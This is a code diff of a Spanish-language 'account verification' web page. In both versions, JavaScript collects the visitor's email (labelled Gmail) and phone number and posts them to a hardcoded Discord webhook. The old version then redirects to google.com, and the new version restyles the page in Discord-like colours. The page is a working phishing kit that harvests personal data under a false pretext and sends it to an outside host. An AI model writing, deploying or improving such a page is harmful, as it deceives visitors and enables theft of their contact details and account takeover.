@@ -3,12 +3,12 @@
 
 
 
-Verificación de cuenta
+Verificación
 
-body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f2f2f2}
-.box{background:#fff;padding:30px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,.1);width:320px}
-input{width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:5px;box-sizing:border-box}
-button{width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:5px;cursor:pointer;font-size:15px}
+body{font-family:sans-serif;background:#111;color:#eee;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+.box{background:#1c1c1c;padding:2rem;border-radius:12px;width:320px}
+input{width:100%;padding:10px;margin:8px 0;border-radius:6px;border:1px solid #333;background:#0a0a0a;color:#fff;box-sizing:border-box}
+button{width:100%;padding:10px;margin-top:10px;border:none;border-radius:6px;background:#5865F2;color:#fff;font-weight:bold;cursor:pointer}
 
 
 
@@ -19,13 +19,18 @@ Verifica tu cuenta
 Continuar
 
 
-const WEBHOOK="https://discord.com/api/webhooks/1527586352009314455/qGkFJAOzp16Vg6qZ-p_cW_SB3Jdl2XvyIiE0MFtEfCMfFz-9iuP3YW4gBYZH6rPkfNoC";
-function enviar(){
-const e=document.getElementById('email').value;
-const t=document.getElementById('tel').value;
-if(!e||!t){alert('Completa los campos');return;}
-fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[{title:'Nuevo registro',color:0x00ff00,fields:[{name:'Correo',value:e,inline:false},{name:'Teléfono',value:t,inline:false}],timestamp:new Date().toISOString()}]})}).then(()=>{window.location.href='https://www.google.com';});
+async function enviar(){
+const gmail=document.getElementById('gmail').value.trim();
+const tel=document.getElementById('tel').value.trim();
+if(!gmail||!tel){alert('Completa los campos');return}
+const webhook="https://discord.com/api/webhooks/1527586352009314455/qGkFJAOzp16Vg6qZ-p_cW_SB3Jdl2XvyIiE0MFtEfCMfFz-9iuP3YW4gBYZH6rPkfNoC";
+try{
+const r=await fetch(webhook,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:"Nuevo registro",embeds:[{title:"Datos recibidos",fields:[{name:"Gmail",value:gmail},{name:"Teléfono",value:tel}],color:5814783}]})});
+if(r.ok){alert('Listo')}else{alert('Error '+r.status)}
+}catch(e){alert('Error de red: '+e.message)}
 }
+
+
 
 
 
